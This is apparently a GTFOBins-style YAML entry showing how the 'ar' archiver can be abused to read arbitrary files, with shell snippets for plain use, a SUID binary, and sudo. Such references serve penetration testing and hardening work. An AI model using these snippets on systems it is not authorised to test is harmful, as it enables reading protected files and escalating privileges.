functions:
  file-read:
    - code: |
        TF=$(mktemp -u)
        LFILE=file_to_read
        ar r "$TF" "$LFILE"
        cat "$TF"
  suid:
    - code: |
        TF=$(mktemp -u)
        LFILE=file_to_read
        ./ar r "$TF" "$LFILE"
        cat "$TF"
  sudo:
    - code: |
        TF=$(mktemp -u)
        LFILE=file_to_read
        sudo ar r "$TF" "$LFILE"
        cat "$TF"
---